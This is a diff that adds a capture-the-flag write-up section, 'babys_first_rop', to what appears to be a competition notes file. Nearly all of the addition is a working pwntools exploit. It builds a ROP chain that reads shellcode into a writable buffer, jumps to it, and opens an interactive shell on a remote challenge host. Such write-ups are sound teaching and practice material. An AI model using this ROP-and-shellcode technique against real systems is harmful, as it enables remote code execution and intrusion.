@@ -53,3 +53,41 @@ Now I just massaged the payload a bit, finding the flag in a file on the server.
 
 You can read more about the badness of Python pickle [here](https://blog.nelhage.com/2011/03/exploiting-pickle/)
 
+
+## babys_first_rop
+
+# pwn
+
+This was a pretty simple ROP challenge. 
+
+```from pwn import *
+
+#p = process(['./babys_first_rop'])
+p = remote('172.31.2.62', 47802)
+context.arch = 'amd64'
+
+def pad_payload(payload, size):
+    n = size - len(payload)
+    payload += 'A' * n
+    return payload
+
+if __name__ == '__main__':
+    ADDR_READ = 0x4004d0
+    SHELLCODE = asm(shellcraft.amd64.linux.sh())
+    print len(SHELLCODE)
+    payload = 'A' * 0x50
+    payload += 'whocares'
+    payload += p64(0x400793) # pop rdi
+    payload += p64(0)
+    payload += p64(0x400791) # pop rsi, pop r15
+    payload += p64(0x601080) # buf
+    payload += 'AAAAAAAA'    # who cares
+    payload += p64(0x60118f) # pop rdx
+    payload += p64(0x64)     # shellcode len
+    payload += p64(ADDR_READ)
+    payload += p64(0x601080)
+    p.sendline(pad_payload(payload, 0xff))
+    p.sendline(SHELLCODE)
+    p.interactive()
+```
+
